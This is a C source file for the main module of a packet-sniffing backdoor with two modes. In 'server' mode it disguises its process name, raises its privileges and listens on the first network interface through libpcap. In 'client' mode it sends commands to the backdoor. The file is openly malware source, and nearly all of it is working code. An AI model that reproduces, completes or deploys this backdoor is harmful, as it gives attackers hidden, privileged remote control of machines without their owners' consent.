#include <pcap/pcap.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include <errno.h>

#include "constants.h"
#include "controller.h"
#include "mask.h"
#include "networking.h"
#include "packet_handler.h"

void pcap_error(char *errbuf);

/*
 * Callback function for examining captured packets.
 *
 * Params:
 *      u_char* args: Pointer to user data.
 *
 *      const struct pcap_pkthdr* header: Struct that contains information about
 * the captured packet.
 *
 *      const u_char* packet: Pointer to the captured packet in serialized form.
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

/*
 * Prints the usage of the program.
 *
 * Params:
 *      char *program_name: argv[0]
 */
void usage(char *program_name)
{
    printf("Usage: %s <mode>\n", program_name);
}

/*
 * Start of the program. This is where the logic forks into backdoor and controller mode. This is also where the pcap
 * loop starts.
 *
 * Params:
 *      int argc: The number of command line arguments.
 *
 *      char **argv[]: The command line arguments.
 *
 *      Mode mode: The operation mode.
 */
int start(int argc, char **argv, Mode mode)
{
    if (mode == BACKDOOR)
    {
        if (mask_process(argv[0], NEW_PROCESS_NAME) != 0)
        {
            fprintf(stderr, "mask_process failed: %s\n", strerror(errno));
            return -1;
        }

        if (raise_privileges(0) != 0)
        {
            fprintf(stderr, "raise_privileges: %s\n", strerror(errno));
            return -1;
        }
    }

    pcap_if_t *alldevs, *temp;
    pcap_t *session;
    char filter_string[] = "ip";
    struct bpf_program filter_program;
    bpf_u_int32 net_addr = 0;
    bpf_u_int32 mask = 0;

    struct handler_args args;
    args.mode = mode;

    int i = 0;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr, "pcap_findalldevs: %s\n", errbuf);
        return -1;
    }

    // Find the first non-loopback interface and use it
    for (temp = alldevs, i = 0; temp; temp = temp->next, ++i)
    {
        if (!(temp->flags & PCAP_IF_LOOPBACK))
        {
            for (pcap_addr_t *a = temp->addresses; a != NULL; a = a->next)
            {
                if (a->addr->sa_family == AF_INET)
                {
                    args.address = ((struct sockaddr_in *)a->addr)->sin_addr;
                }
            }
            break;
        }
    }

    // Start the sniffing session
    session = pcap_open_live(temp->name, BUFSIZ, 0, -1, errbuf);
    if (!session)
    {
        fprintf(stderr, "Could not open device %s: %s\n", temp->name, errbuf);
        return -1;
    }

    // Find IPv4 address and network number of the selected device
    if (pcap_lookupnet(temp->name, &net_addr, &mask, errbuf))
    {
        fprintf(stderr, "pcap_lookupnet: %s\n", errbuf);
        return -1;
    }

    // Compile the filter string
    if (pcap_compile(session, &filter_program, filter_string, 0, net_addr) == -1)
    {
        fprintf(stderr, "Error calling pcap_compile\n");
        return -1;
    }

    // Load the filter into the capture device
    if (pcap_setfilter(session, &filter_program) == -1)
    {
        fprintf(stderr, "Error setting filter\n");
        return -1;
    }

    if (mode == CONTROLLER)
    {
        issue_command(args.address, argv[2], argv[3]);
    }
    // Start capturing packets
    pcap_loop(session, 0, got_packet, (u_char *)&args);

    // Clean up handles
    pcap_freealldevs(alldevs);
    return 0;
}

/*
 * Entry point of the program.
 *
 * Params;
 *      int argv: The number of command line arguments.
 *
 *      char *argv[]: The command line arguments.
 *
 * Returns:
 *      The return code of the program.
 */
int main(int argc, char *argv[])
{

    Mode mode;

    if (argc < 2)
    {
        usage(argv[0]);
        return -1;
    }

    // Settting the run mode of the program
    if (strcmp(argv[1], "client") == 0)
    {
        printf("Starting in client mode\n");
        mode = CONTROLLER;
    }
    else if (strcmp(argv[1], "server") == 0)
    {
        printf("Starting in server mode\n");
        mode = BACKDOOR;
    }
    else
    {
        usage(argv[0]);
        return -1;
    }
    start(argc, argv, mode);
    return 0;
}
